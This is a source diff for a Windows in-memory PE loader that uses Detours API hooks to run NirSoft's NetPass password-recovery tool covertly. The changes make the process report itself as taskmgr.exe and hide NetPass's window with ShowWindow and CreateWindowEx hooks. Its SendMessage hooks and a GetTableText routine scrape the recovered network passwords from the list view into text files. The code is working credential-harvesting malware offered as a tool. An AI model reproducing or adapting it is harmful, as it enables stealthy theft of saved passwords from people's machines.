@@ -2,6 +2,7 @@
 //
 
 #include "stdafx.h"
+#include <CommCtrl.h>
 #include "MemoryModule.h"
 #define WIN32_LEAN_AND_MEAN
 #ifndef _CRT_SECURE_NO_WARNINGS
@@ -14,43 +15,8 @@
 #include <stdio.h>
 #include <malloc.h>
 #include "detours/detours.h"
-void* ReadLibrary(long* pSize, char* fileName) {
-	long read;
-	void* result;
-	FILE* fp;
+#include "Tools.h"
 
-	fp = _tfopen(fileName, _T("rb"));
-	if (fp == NULL)
-	{
-		_tprintf(_T("Can't open DLL file \"%s\"."), fileName);
-		return NULL;
-	}
-
-	fseek(fp, 0, SEEK_END);
-	*pSize = ftell(fp);
-	if (*pSize < 0)
-	{
-		fclose(fp);
-		return NULL;
-	}
-
-	result = (unsigned char *)malloc(*pSize);
-	if (result == NULL)
-	{
-		return NULL;
-	}
-
-	fseek(fp, 0, SEEK_SET);
-	read = fread(result, 1, *pSize, fp);
-	fclose(fp);
-	if (read != static_cast<size_t>(*pSize))
-	{
-		free(result);
-		return NULL;
-	}
-
-	return result;
-}
 // 重定向函数
 #include <list>
 typedef std::list<HMEMORYMODULE> ListMemMod;
@@ -234,19 +200,27 @@ bool IsMemRsrcLoad(HMEMORYRSRC hMemRsrc)
 
 // why not hook the iat ? because if you call 3rd dll and the 3rd dll maybe call we care fuctions
 //--
+// need fix
+//*GetAny_temp 函数应该管理一个列表
+//*hk_GetModuleHandleExA 中应该判断lpModuleName的指针指向是地址还是字串
 typedef HMODULE (WINAPI *PF_GetModuleHandleA)(LPCSTR lpModuleName);
 PF_GetModuleHandleA pPF_GetModuleHandleA = 0;
 HANDLE WINAPI hk_GetModuleHandleA(LPCSTR lpModuleName)
 {
-	LPVOID lpAddr = _ReturnAddress();
-	HMEMORYMODULE hMemMod = FindCallFrom(lpAddr);// need parse module name ? no !
-	if (hMemMod)
-		return hMemMod;
-	else if (!lpModuleName){
-		hMemMod = GetAny_temp();
-		return hMemMod;
-	}
-	else
+	if (!lpModuleName)
+	{
+		LPVOID lpAddr = _ReturnAddress();
+		HMEMORYMODULE hMemMod = FindCallFrom(lpAddr);// need parse module name ? no !
+		if (hMemMod)
+			return hMemMod;
+		else if (!lpModuleName){
+			hMemMod = GetAny_temp();
+			return hMemMod;
+		}
+		else
+			return pPF_GetModuleHandleA(lpModuleName);
+
+	}else
 		return pPF_GetModuleHandleA(lpModuleName);
 }
 //--
@@ -254,13 +228,18 @@ typedef HMODULE (WINAPI *PF_GetModuleHandleW)(LPCWSTR lpModuleName);
 PF_GetModuleHandleW pPF_GetModuleHandleW = 0;
 HANDLE WINAPI hk_GetModuleHandleW(LPCWSTR lpModuleName)
 {
-	LPVOID lpAddr = _ReturnAddress();
-	HMEMORYMODULE hMemMod = FindCallFrom(lpAddr);// need parse module name ? no !
-	if (hMemMod)
-		return hMemMod;
-	else if (!lpModuleName){
-		hMemMod = GetAny_temp();
-		return hMemMod;
+	if (!lpModuleName)
+	{
+		LPVOID lpAddr = _ReturnAddress();
+		HMEMORYMODULE hMemMod = FindCallFrom(lpAddr);// need parse module name ? no !
+		if (hMemMod)
+			return hMemMod;
+		else if (!lpModuleName){
+			hMemMod = GetAny_temp();
+			return hMemMod;
+		}
+		else
+			return pPF_GetModuleHandleW(lpModuleName);
 	}else
 		return pPF_GetModuleHandleW(lpModuleName);
 }
@@ -269,44 +248,60 @@ typedef BOOL(WINAPI *PF_GetModuleHandleExA)(DWORD dwFlags, LPCSTR lpModuleName, 
 PF_GetModuleHandleExA pPF_GetModuleHandleExA = 0; 
 BOOL WINAPI hk_GetModuleHandleExA(DWORD dwFlags, LPCSTR lpModuleName, HMODULE * phModule)
 {
-	LPVOID lpAddr = _ReturnAddress();
-	HMEMORYMODULE hMemMod = FindCallFrom(lpAddr);// need parse module name ? no !
-	if (hMemMod){
-		*phModule = (HMODULE)hMemMod;
-		return TRUE;
-	}
-	else if (!lpModuleName){
-		hMemMod = GetAny_temp();
-		*phModule = (HMODULE)hMemMod;
-		return TRUE;
-	}
-	else
+	if (!lpModuleName)
+	{
+		LPVOID lpAddr = _ReturnAddress();
+		HMEMORYMODULE hMemMod = FindCallFrom(lpAddr);// need parse module name ? no !
+		if (hMemMod){
+			*phModule = (HMODULE)hMemMod;
+			return TRUE;
+		}
+		else if (!lpModuleName){
+			hMemMod = GetAny_temp();
+			*phModule = (HMODULE)hMemMod;
+			return TRUE;
+		}
+		else
+			return pPF_GetModuleHandleExA(dwFlags, lpModuleName, phModule);
+	}else
 		return pPF_GetModuleHandleExA(dwFlags, lpModuleName, phModule);
+
 }
 //--
 typedef BOOL(WINAPI *PF_GetModuleHandleExW)(DWORD dwFlags, LPCWSTR lpModuleName, HMODULE * phModule);
 PF_GetModuleHandleExW pPF_GetModuleHandleExW = 0; 
 BOOL WINAPI hk_GetModuleHandleExW(DWORD dwFlags, LPCWSTR lpModuleName, HMODULE * phModule)
 {
-	LPVOID lpAddr = _ReturnAddress();
-	HMEMORYMODULE hMemMod = FindCallFrom(lpAddr);// need parse module name ? no !
-	if (hMemMod){
-		*phModule = (HMODULE)hMemMod;
-		return TRUE;
-	}
-	else if (!lpModuleName){
-		hMemMod = GetAny_temp();
-		*phModule = (HMODULE)hMemMod;
-		return TRUE;
-	}
-	else
+	if (!lpModuleName)
+	{
+		LPVOID lpAddr = _ReturnAddress();
+		HMEMORYMODULE hMemMod = FindCallFrom(lpAddr);// need parse module name ? no !
+		if (hMemMod){
+			*phModule = (HMODULE)hMemMod;
+			return TRUE;
+		}
+		else if (!lpModuleName){
+			hMemMod = GetAny_temp();
+			*phModule = (HMODULE)hMemMod;
+			return TRUE;
+		}
+		else
+			return pPF_GetModuleHandleExW(dwFlags, lpModuleName, phModule);
+	}else
 		return pPF_GetModuleHandleExW(dwFlags, lpModuleName, phModule);
 }
 
 // #define EXE_FILE ("C:\\Users\\Administrator\\Desktop\\netpass\\netpass_unpack.exe")
 // #define EXE_FILE_W (L"C:\\Users\\Administrator\\Desktop\\netpass\\netpass_unpack.exe")
-#define EXE_FILE ("netpass_unpack.exe")
-#define EXE_FILE_W (L"netpass_unpack.exe")
+// #define EXE_FILE_dumy ("netpass_unpack.exed")
+// #define EXE_FILE_W_dumy (L"netpass_unpack.exed")
+// #define EXE_FILE ("netpass_unpack.exe")
+// #define EXE_FILE_W (L"netpass_unpack.exe")
+
+#define EXE_FILE_dumy ("C:\\Windows\\SysWOW64\\taskmgr.exed")
+#define EXE_FILE_W_dumy (L"C:\\Windows\\SysWOW64\\taskmgr.exed")
+#define EXE_FILE ("C:\\Windows\\SysWOW64\\taskmgr.exe")
+#define EXE_FILE_W (L"C:\\Windows\\SysWOW64\\taskmgr.exe")
 
 //--
 typedef DWORD(WINAPI *PF_GetModuleFileNameA)(HMODULE hModule, LPSTR lpFilename,DWORD nSize);
@@ -317,8 +312,8 @@ DWORD WINAPI hk_GetModuleFileNameA(HMODULE hModule, LPSTR lpFilename, DWORD nSiz
 		CHAR szBuffer[MAX_PATH];
 		GetCurrentDirectoryA(MAX_PATH, szBuffer);
 		strcpy(lpFilename, szBuffer);
-		strcat(lpFilename, EXE_FILE);
-		return sizeof(EXE_FILE);// fix me the size
+		strcat(lpFilename, EXE_FILE_dumy);
+		return sizeof(EXE_FILE_dumy);// fix me the size
 	}
 	return pPF_GetModuleFileNameA(hModule, lpFilename, nSize);
 }
@@ -331,8 +326,8 @@ DWORD WINAPI hk_GetModuleFileNameW(HMODULE hModule, LPWSTR lpFilename, DWORD nSi
 		WCHAR szBuffer[MAX_PATH];
 		GetCurrentDirectoryW(MAX_PATH, szBuffer);
 		wcscpy(lpFilename, szBuffer);
-		wcscat(lpFilename, EXE_FILE_W);
-		return sizeof(EXE_FILE_W);
+		wcscat(lpFilename, EXE_FILE_W_dumy);
+		return sizeof(EXE_FILE_W_dumy);
 	}
 	return pPF_GetModuleFileNameW(hModule, lpFilename, nSize);
 }
@@ -342,8 +337,8 @@ PF_GetModuleFileNameExA pPF_GetModuleFileNameExA = 0;
 DWORD WINAPI hk_GetModuleFileNameExA(HANDLE hProcess, HMODULE hModule, LPSTR lpFilename, DWORD nSize)
 {
 	if (GetCurrentProcess() == hProcess && !hModule){
-		strcpy(lpFilename, EXE_FILE);
-		return sizeof(EXE_FILE);
+		strcpy(lpFilename, EXE_FILE_dumy);
+		return sizeof(EXE_FILE_dumy);
 	}
 	return pPF_GetModuleFileNameExA(hProcess, hModule, lpFilename, nSize);
 }
@@ -354,8 +349,8 @@ DWORD WINAPI hk_GetModuleFileNameExW(HANDLE hProcess, HMODULE hModule, LPWSTR lp
 {
 	if (GetCurrentProcess() == hProcess && !hModule){
 		DebugBreak();
-		wcscpy(lpFilename, EXE_FILE_W);
-		return sizeof(EXE_FILE);
+		wcscpy(lpFilename, EXE_FILE_W_dumy);
+		return sizeof(EXE_FILE_dumy);
 	}
 
 	return pPF_GetModuleFileNameExW(hProcess, hModule, lpFilename, nSize);
@@ -618,10 +613,92 @@ VOID WINAPI hk_ExitProcess(UINT uExitCode)
 	pPF_ExitProcess(uExitCode);
 }
 //--------------- 简化处理 end
+//for hide windows
+typedef HWND (WINAPI *PF_CreateWindowExA)(DWORD dwExStyle,LPCSTR lpClassName,LPCSTR lpWindowName,DWORD dwStyle,
+int X,int Y,int nWidth,int nHeight,HWND hWndParent,HMENU hMenu,HINSTANCE hInstance,LPVOID lpParam);
+PF_CreateWindowExA pPF_CreateWindowExA = 0;
+HWND WINAPI hk_CreateWindowExA(DWORD dwExStyle, LPCSTR lpClassName, LPCSTR lpWindowName, DWORD dwStyle,
+	int X, int Y, int nWidth, int nHeight, HWND hWndParent, HMENU hMenu, HINSTANCE hInstance, LPVOID lpParam)
+{
+	if (lpClassName && 0 == strcmp(lpClassName, "NetPass")){
+		dwExStyle = dwExStyle | WS_EX_TOOLWINDOW;
+		//dwStyle = dwStyle |~WS_VISIBLE; 
+	}
+
+	HWND hWnd = pPF_CreateWindowExA(dwExStyle, lpClassName, lpWindowName, dwStyle,
+		X, Y, nWidth, nHeight, hWndParent, hMenu, hInstance, lpParam);
+
+	return hWnd;
+}
+typedef BOOL (WINAPI *PF_ShowWindow)(HWND hWnd, int nCmdShow);
+PF_ShowWindow pPF_ShowWindow = 0;
+BOOL WINAPI hk_ShowWindow(HWND hWnd, int nCmdShow)
+{
+	pPF_ShowWindow(hWnd, SW_HIDE);
+	return TRUE;
+}
+
+
+typedef HWND(WINAPI *PF_CreateWindowExW)(DWORD dwExStyle, LPCWSTR lpClassName, LPCWSTR lpWindowName, DWORD dwStyle,
+	int X, int Y, int nWidth, int nHeight, HWND hWndParent, HMENU hMenu, HINSTANCE hInstance, LPVOID lpParam);
+PF_CreateWindowExW pPF_CreateWindowExW = 0;
+HWND WINAPI hk_CreateWindowExW(DWORD dwExStyle, LPCWSTR lpClassName, LPCWSTR lpWindowName, DWORD dwStyle,
+	int X, int Y, int nWidth, int nHeight, HWND hWndParent, HMENU hMenu, HINSTANCE hInstance, LPVOID lpParam)
+{
+// 	if (lpClassName && 0 == wcscmp(lpClassName, L"Netpass"))
+// 		dwExStyle = WS_EX_NOACTIVATE;
+
+	return pPF_CreateWindowExW(dwExStyle, lpClassName, lpWindowName, dwStyle,
+		X, Y, nWidth, nHeight, hWndParent, hMenu, hInstance, lpParam);
+}
+typedef LRESULT (WINAPI *PF_SendMessageA)(HWND hWnd,UINT Msg,WPARAM wParam,LPARAM lParam);
+PF_SendMessageA pPF_SendMessageA = 0;
+LRESULT WINAPI hk_SendMessageA(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam)
+{
+	if (LVM_SETITEMTEXTA == Msg){
+		LPLVITEMA pItem = (LPLVITEMA)lParam;
+		//MessageBoxA(0, "t", pItem->pszText, MB_OK);
+		WriteFileAdd((char*)pItem->pszText, strlen(pItem->pszText), "test2.txt");
+		WriteFileAdd("\n\r", 2, "test2.txt");
+
+		return pPF_SendMessageA(hWnd, Msg, wParam, lParam);
+	}
+	return pPF_SendMessageA(hWnd, Msg, wParam, lParam);
+}
+typedef LRESULT(WINAPI *PF_SendMessageW)(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam);
+PF_SendMessageW pPF_SendMessageW = 0;
+LRESULT WINAPI hk_SendMessageW(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam)
+{
+	if (LVM_SETITEMTEXTW == Msg){
+		LPLVITEMW pItem = (LPLVITEMW)lParam;
+		//MessageBoxW(0, L"t", pItem->pszText, MB_OK);
+		WriteFileAdd((char*)pItem->pszText, wcslen(pItem->pszText), "test3.txt");
+		WriteFileAdd("\n\r", 2, "test3.txt");
+		return pPF_SendMessageW(hWnd, Msg, wParam, lParam);// ListView_SetItemText
+	}
+	return pPF_SendMessageW(hWnd, Msg, wParam, lParam); //DrawTextW
+}
+
+
+//SetWindowTextA
+// ListView_SetItemText
+// SendMessage
+
+
+
+// hide windows end
+
 void hook()
 {
 	DetourTransactionBegin();
 	DetourUpdateThread(GetCurrentThread());
+	DetourAttach(&(PVOID&)(pPF_CreateWindowExA = CreateWindowExA), hk_CreateWindowExA);
+	DetourAttach(&(PVOID&)(pPF_CreateWindowExW = CreateWindowExW), hk_CreateWindowExW);
+	DetourAttach(&(PVOID&)(pPF_ShowWindow = ShowWindow), hk_ShowWindow);
+	DetourAttach(&(PVOID&)(pPF_SendMessageA = SendMessageA), hk_SendMessageA);
+	DetourAttach(&(PVOID&)(pPF_SendMessageW = SendMessageW), hk_SendMessageW);
+
+
 	DetourAttach(&(PVOID&)(pPF_GetModuleHandleA = GetModuleHandleA), hk_GetModuleHandleA);
 	DetourAttach(&(PVOID&)(pPF_GetModuleHandleW = GetModuleHandleW), hk_GetModuleHandleW);
 	DetourAttach(&(PVOID&)(pPF_GetModuleHandleExA = GetModuleHandleExA), hk_GetModuleHandleExA);
@@ -672,6 +749,13 @@ void unhook()
 {
 	DetourTransactionBegin();
 	DetourUpdateThread(GetCurrentThread());
+	DetourDetach(&(PVOID&)pPF_CreateWindowExA, hk_CreateWindowExA);
+	DetourDetach(&(PVOID&)pPF_CreateWindowExW, hk_CreateWindowExW);
+	DetourDetach(&(PVOID&)pPF_ShowWindow, hk_ShowWindow);
+	DetourDetach(&(PVOID&)pPF_SendMessageA, hk_SendMessageA);
+	DetourDetach(&(PVOID&)pPF_SendMessageW, hk_SendMessageW);
+
+
 	DetourDetach(&(PVOID&)pPF_GetModuleHandleA, hk_GetModuleHandleA);
 	DetourDetach(&(PVOID&)pPF_GetModuleHandleW, hk_GetModuleHandleW);
 	DetourDetach(&(PVOID&)pPF_GetModuleHandleExA, hk_GetModuleHandleExA);
@@ -734,20 +818,16 @@ LPVOID MemoryMyAlloc(LPVOID address, SIZE_T size, DWORD allocationType, DWORD pr
 	if ((LPVOID)0x400000 == address){
 		return g_pMemEXE;
 	}
+	if ((LPVOID)0x400000 <= address && (char*)address + size <= (char*)0x400000 + 1024*1024*5){
+		return address;
+	}
 	return VirtualAlloc(address, size, allocationType, protect);
 }
-HMEMORYMODULE LoadMemExe(char* fileName)
+HMEMORYMODULE LoadMemExe(char* data, long size)
 {
-	void *data;
-	long size;
+
 	HMEMORYMODULE handle;
 	TCHAR buffer[100];
-
-	data = ReadLibrary(&size, fileName);
-	if (data == NULL)
-	{
-		return 0;
-	}
 
 	//handle = MemoryLoadLibrary(data, size);
 	handle = MemoryLoadLibraryEx(data, size, MemoryMyAlloc, MemoryDefaultFree, MemoryDefaultLoadLibrary,
@@ -761,25 +841,37 @@ HMEMORYMODULE LoadMemExe(char* fileName)
 	AddMemMod(handle);
 	return handle;
 }
-
-
+extern "C" LPVOID lpMyReserved = 0;
 #include <psapi.h>
-extern "C" __declspec(dllexport) int test(LPVOID lpMemExeAddr){
+extern "C" __declspec(dllexport) int WINAPI Run(LPVOID lpMemExeAddr){
 
 	g_pMemEXE = lpMemExeAddr;
 	if (!g_pMemEXE){
 		return 0;
 	}
+	PIMAGE_DOS_HEADER dos_header = (PIMAGE_DOS_HEADER)lpMemExeAddr;
+	PIMAGE_NT_HEADERS old_header = (PIMAGE_NT_HEADERS)&((const unsigned char *)(dos_header))[dos_header->e_lfanew];
+	DWORD dwProtect = 0;
+	Sleep(100);// wait for host run to waiting
+	BOOL bChge = VirtualProtectEx(GetCurrentProcess(), dos_header, old_header->OptionalHeader.SizeOfImage, PAGE_EXECUTE_READWRITE, &dwProtect);
 
 	CHAR Buffer[256];
 	GetCurrentDirectoryA(256,Buffer);
-	HMEMORYMODULE hMemMod = LoadMemExe(EXE_FILE);
-	hook();
-	if (IsMemModLoad_ByMemHand(hMemMod))
-		MemoryCallEntryPoint(hMemMod);
 
-	// 	MemoryFreeLibrary(hMemMod);
-	unhook();
+	char *data;
+	long size;
+	data = (char*)ReadLibrary(&size, EXE_FILE);
+	if (data)
+	{
+		HMEMORYMODULE hMemMod = LoadMemExe(data, size);
+		hook();
+		if (IsMemModLoad_ByMemHand(hMemMod))
+			MemoryCallEntryPoint(hMemMod);
+
+		// 	MemoryFreeLibrary(hMemMod);
+		unhook();
+	}
+
 	return 0;
 
 
@@ -803,11 +895,138 @@ extern "C" __declspec(dllexport) int test(LPVOID lpMemExeAddr){
 	}
 
 
-
-	hook();
-	GetClipboardData(0);
-	unhook();
-
-
 	return 0;
+}
+bool isRuning(LPVOID lpReserved)
+{
+	typedef struct _procstruct
+	{
+		//int isFirstCalled;
+		HMODULE passMod;
+		//char *path;
+		int CmdLine;
+		void * dllAddr;
+		int dllSize;
+		HANDLE msg_event;
+
+	}ProcStruct, *PProcStruct;
+
+	HANDLE mutex = ::CreateMutex(NULL, FALSE, "f5DSbklsFkw14X_mutex");//随便敲的
+	if (GetLastError() == ERROR_ALREADY_EXISTS)
+	{
+		SetEvent(((PProcStruct)lpReserved)->msg_event);
+		if (mutex != NULL)
+		{
+			CloseHandle(mutex);
+			mutex = NULL;
+		}
+		return true;
+	}
+	return false;
+}
+
+#define ROW_MAX 20
+#define COL_MAX 20
+#define TEXT_LEN_MAX 128
+char textTable[ROW_MAX][COL_MAX][TEXT_LEN_MAX];
+
+int WINAPI GetTableText(LPVOID)
+{
+	Sleep(3000);
+	for (int i = 0; i < ROW_MAX; i++)
+	{
+		for (int j = 0; j < COL_MAX; j++)
+		{
+			memset(textTable[i][j], 0, TEXT_LEN_MAX);
+		}
+	}
+	HANDLE    hProcess;
+	LVITEM    *pointer;
+	HWND    hwnd, hListview;
+	int headerhwnd; //listview控件的列头句柄
+	int rows, cols;  //listview控件中的行列数
+	DWORD ProcessID = NULL;
+	DWORD ThreadID = NULL;
+
+	hwnd = (HWND)::FindWindow(_T("NetPass"), _T("Network Password Recovery"));
+	//进程界面窗口的句柄,通过SPY获取
+	hListview = (HWND)::FindWindowEx(hwnd, 0, _T("SysListView32"), NULL);
+
+	//listview的列头句柄
+	//headerhwnd = ::SendMessage(hListview, LVM_GETHEADER, 0, 0);
+
+	//总行数:进程的数量
+	rows = ::SendMessage(hListview, LVM_GETITEMCOUNT, 0, 0);
+	rows = rows > ROW_MAX ? ROW_MAX : rows;
+	//列表列数
+	cols = ::SendMessage(hListview, HDM_GETITEMCOUNT, 0, 0);
+	cols = cols > COL_MAX ? COL_MAX : cols;
+
+
+	//ThreadID = GetWindowThreadProcessId(hListview, &ProcessID);
+
+	//打开并插入进程
+	hProcess = GetCurrentProcess();//OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_QUERY_INFORMATION, FALSE, ProcessID);
+	//申请代码的内存区
+	pointer = (LVITEM*)VirtualAllocEx(hProcess, NULL, sizeof(LVITEM), MEM_COMMIT, PAGE_READWRITE);
+
+	for (int i = 0; i < rows; i++)
+	{
+		for (int j = 0; j < cols; j++)
+		{
+			LVITEM vItem;
+			vItem.mask = LVIF_TEXT;    //说明pszText是有效的
+			vItem.iItem = i;        //行号
+			vItem.iSubItem = j;     //列号
+			vItem.cchTextMax = TEXT_LEN_MAX;    //所能存储的最大的文本为256字节
+			LPSTR pItem = NULL;
+			pItem = (LPSTR)VirtualAllocEx(hProcess, NULL, TEXT_LEN_MAX, MEM_COMMIT, PAGE_READWRITE);
+			vItem.pszText = pItem;
+
+			WriteProcessMemory(hProcess, pointer, &vItem, sizeof(LVITEM), NULL);
+			::SendMessageA(hListview, LVM_GETITEM, (WPARAM)i, (LPARAM)pointer);
+			memset(textTable[i][j], 0, TEXT_LEN_MAX);
+			ReadProcessMemory(hProcess, pItem, textTable[i][j], TEXT_LEN_MAX, NULL);
+			VirtualFreeEx(hProcess, pItem, 0, MEM_RELEASE);
+		}
+	}
+	//释放内存空间
+	VirtualFreeEx(hProcess, pointer, 0, MEM_RELEASE);//在其它进程中释放申请的虚拟内存空间,MEM_RELEASE方式很彻底,完全回收
+	CloseHandle(hProcess);
+
+	//write to file
+	char filename[] = "test.txt";
+	//WriteFileOver("\n\r", 2, filename);//jie duan
+	for (int i = 0; i < rows; i++)
+	{
+		for (int j = 0; j < cols; j++)
+		{
+			MessageBoxA(0, textTable[i][j], "x", MB_OK);
+			if (strlen(textTable[i][j]) >= 0 && strlen(textTable[i][j]) < TEXT_LEN_MAX){
+				memset(&textTable[i][j][strlen(textTable[i][j])], 0x20, TEXT_LEN_MAX - strlen(textTable[i][j]));
+				textTable[i][j][TEXT_LEN_MAX - 1] = 0;
+				WriteFileAdd(textTable[i][j], strlen(textTable[i][j]), filename);
+			}
+			else{
+				WriteFileAdd("add space err !\n\r", 2, filename);
+			}
+		}
+		WriteFileAdd("\n\r", 2, filename);
+	}
+	return 0;
+}
+void StartRun(LPVOID lpReserved)
+{
+	//char filename[] = "G:\\dev_code_x\\patchframe\\Debug\\test.txt";
+// 	char filename[] = "G:\\dev_code_x\\patchframe\\Debug\\test.txt";
+// 	char test[8] = "123456";
+// 	char test2[8] = "123x";
+// 	WriteFileOver(test, strlen(test), filename);
+// 	WriteFileAdd(test2, strlen(test2), filename);
+// 	if (isRuning(lpReserved))
+// 		return;
+
+	CloseHandle(CreateThread(NULL, 8192, (LPTHREAD_START_ROUTINE)Run, (LPVOID)lpReserved, 0, 0));
+	//CloseHandle(CreateThread(NULL, 8192, (LPTHREAD_START_ROUTINE)GetTableText, (LPVOID)lpReserved, 0, 0));
+	return;
 }
